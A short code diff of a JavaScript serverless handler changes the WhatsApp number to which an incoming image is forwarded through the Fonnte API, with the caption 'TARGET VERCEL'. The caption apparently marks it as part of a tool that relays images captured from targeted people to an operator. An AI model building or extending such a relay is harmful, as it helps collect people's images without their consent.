@@ -6,7 +6,7 @@ module.exports = async (req, res) => {
         const { image } = req.body;
         try {
             const response = await axios.post('https://api.fonnte.com/send', {
-                target: '6283823170469',
+                target: '625117090357',
                 url: image,
                 caption: '🚨 *TARGET VERCEL* 🚨',
             }, {
